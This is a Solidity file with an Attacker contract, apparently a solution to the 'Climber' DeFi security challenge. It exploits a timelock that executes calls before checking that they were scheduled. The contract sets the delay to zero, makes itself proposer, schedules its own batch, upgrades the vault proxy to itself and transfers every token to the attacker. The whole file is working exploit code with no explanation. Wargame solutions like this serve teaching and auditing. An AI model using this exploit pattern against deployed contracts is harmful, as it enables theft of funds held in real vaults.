pragma solidity 0.8.12;

import {ClimberTimelock} from "./ClimberTimelock.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract Attacker is UUPSUpgradeable {
    ClimberTimelock internal climberTimelock;

    address immutable attacker;
    address internal climberVaultProxy;

    IERC20 immutable token;

    constructor(
        address payable climbertimelock,
        address climberVaultProxy_,
        IERC20 token_
    ) {
        climberTimelock = ClimberTimelock(climbertimelock);
        attacker = msg.sender;
        climberVaultProxy = climberVaultProxy_;
        token = token_;
    }

    function buildAttack()
        internal
        view
        returns (address[] memory, uint256[] memory, bytes[] memory)
    {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory datas = new bytes[](4);

        targets[0] = address(climberTimelock); // set delay to 0
        values[0] = uint256(0);
        datas[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        targets[1] = address(climberTimelock); // set address(this) as proposer
        values[1] = uint256(0);
        datas[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            climberTimelock.PROPOSER_ROLE(),
            address(this)
        );

        targets[2] = address(this); // schedule an upgrade and call
        values[2] = uint256(0);
        datas[2] = abi.encodeWithSignature("scheduleAttack()");

        targets[3] = address(climberVaultProxy); // upgrade this contract as new proxy and call steal funds
        values[3] = uint256(0);
        datas[3] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(this),
            abi.encodeWithSignature("stealFunds()")
        );

        return (targets, values, datas);
    }

    function attack() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory datas
        ) = buildAttack();
        climberTimelock.execute(targets, values, datas, 0);
    }

    function stealFunds() external {
        uint256 balance = token.balanceOf(address(this));
        token.transfer(attacker, balance);
    }

    function scheduleAttack() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory datas
        ) = buildAttack();
        climberTimelock.schedule(targets, values, datas, 0);
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
